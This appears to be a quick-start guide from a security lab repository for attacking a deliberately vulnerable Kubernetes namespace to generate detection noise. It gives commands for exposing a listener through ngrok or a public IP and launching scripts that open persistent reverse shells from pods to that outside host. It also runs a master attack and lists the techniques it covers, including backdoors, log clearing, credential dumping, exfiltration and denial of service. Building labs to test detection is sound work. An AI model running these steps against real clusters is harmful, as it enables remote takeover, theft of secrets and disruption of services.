# Quick Guide: Advanced Attacks and Noise Generation

## üéØ Objective: Generate Maximum Noise and Establish Reverse Shells Accessible from Outside AWS

## Option 1: Use ngrok (Recommended - Easiest)

### Step 1: Configure ngrok on your local machine

```bash
# Install ngrok (if you don't have it)
brew install ngrok/ngrok/ngrok  # macOS
# Or download from: https://ngrok.com/download

# Configure your token (free at https://dashboard.ngrok.com)
ngrok config add-authtoken YOUR_TOKEN_HERE

# Start tunnel on port 4444
./exploitation/ngrok-setup.sh 4444
```

This will give you a public URL like: `0.tcp.ngrok.io:12345`

### Step 2: Listen on your local machine

```bash
# In another terminal
nc -lvp 4444
```

### Step 3: Establish reverse shells from pods

```bash
# From the bastion or your machine (with cluster access)
cd exploitation

# Use ngrok public URL
./reverse-shell-persistent.sh vulnerable-apps 0.tcp.ngrok.io 12345 all
```

### Step 4: Connect from anywhere

```bash
# From any machine with internet
nc 0.tcp.ngrok.io 12345
```

## Option 2: Use your Public IP

### Step 1: Get your public IP

```bash
curl ifconfig.me
# Or visit: https://whatismyipaddress.com
```

### Step 2: Open port on your router/firewall

Open port 4444 (or your preferred port) on your router/firewall to allow incoming connections.

### Step 3: Listen on your machine

```bash
nc -lvp 4444
```

### Step 4: Establish reverse shells

```bash
# From the bastion
cd exploitation
./reverse-shell-persistent.sh vulnerable-apps YOUR_PUBLIC_IP 4444 python
```

## üö® Generate Maximum Noise

### Option A: All in one (Maximum Noise)

```bash
# With ngrok
./master-attack.sh vulnerable-apps 0.tcp.ngrok.io 12345

# With public IP
./master-attack.sh vulnerable-apps YOUR_PUBLIC_IP 4444
```

### Option B: Individual Scripts

```bash
# 1. Generate basic noise
./generate-noise.sh vulnerable-apps high

# 2. Advanced attacks
./advanced-attacks.sh vulnerable-apps

# 3. Establish reverse shells
./reverse-shell-persistent.sh vulnerable-apps YOUR_IP 4444 all
```

## üìä Attack Techniques Included

### MITRE ATT&CK Framework

- **Initial Access**: Web/API vulnerability exploitation
- **Execution**: Command injection, reverse shells
- **Persistence**: Backdoors, cron jobs, systemd services
- **Privilege Escalation**: SUID binaries, capabilities, host filesystem access
- **Defense Evasion**: Disable logging, clean logs
- **Credential Access**: Credential dumping, secret reading
- **Discovery**: System and network enumeration
- **Lateral Movement**: Network scanning, access to other services
- **Collection**: Sensitive data collection
- **Exfiltration**: DNS exfiltration, HTTP POST, ICMP
- **Command and Control**: C2 communication, heartbeat
- **Impact**: Resource exhaustion, DoS

## üî• Activities that Generate Noise

1. **Massive Scanning**: Thousands of pings and TCP connections
2. **Aggressive Enumeration**: Multiple requests to Kubernetes API
3. **Suspicious Processes**: CPU and memory intensive
4. **Anomalous HTTP Traffic**: Multiple requests to vulnerable endpoints
5. **Secret Access**: Attempts to read secrets and configmaps
6. **File Modification**: Creation of malicious files
7. **Backdoors**: Multiple entry points
8. **Exfiltration**: Attempts to send data out
9. **Privilege Escalation**: Multiple privesc attempts
10. **Suspicious Logs**: Generation of suspicious events

## üìù Complete Example with ngrok

```bash
# Terminal 1: Configure ngrok
cd ~/exploitation
./ngrok-setup.sh 4444
# Note the public URL (e.g.: 0.tcp.ngrok.io:12345)

# Terminal 2: Listen locally
nc -lvp 4444

# Terminal 3: Run all attacks
./master-attack.sh vulnerable-apps 0.tcp.ngrok.io 12345

# Wait for connections to be established
# You'll see shells connecting in Terminal 2
```

## üõ†Ô∏è Troubleshooting

### ngrok not working
```bash
# Verify ngrok is running
ps aux | grep ngrok

# View logs
cat /tmp/ngrok.log

# Verify tunnel
curl http://localhost:4040/api/tunnels
```

### Reverse shells not connecting
```bash
# Verify listener is active
netstat -an | grep 4444

# Verify connectivity from pod
kubectl exec -it <pod> -n vulnerable-apps -- nc -zv YOUR_IP 4444
```

### Generate more noise
```bash
# Run multiple times
for i in {1..5}; do
    ./generate-noise.sh vulnerable-apps high &
done

# Run on multiple pods
for pod in $(kubectl get pods -n vulnerable-apps -o name); do
    kubectl exec -it $pod -n vulnerable-apps -- ./generate-noise.sh &
done
```

## ‚ö†Ô∏è Warnings

- These scripts are designed **ONLY for security labs**
- Generate **LOTS of noise** and suspicious activity
- May cause **high resource consumption**
- Reverse shells may be **detected by security systems**
- **DO NOT use in production** or without explicit authorization

## üìà Monitoring Generated Noise

```bash
# View resource usage
kubectl top pods -n vulnerable-apps

# View events
kubectl get events -n vulnerable-apps --sort-by='.lastTimestamp'

# View pod logs
kubectl logs -n vulnerable-apps -l app=vulnerable-web-app --tail=100

# View network connections
kubectl exec -it <pod> -n vulnerable-apps -- netstat -an | grep ESTABLISHED
```
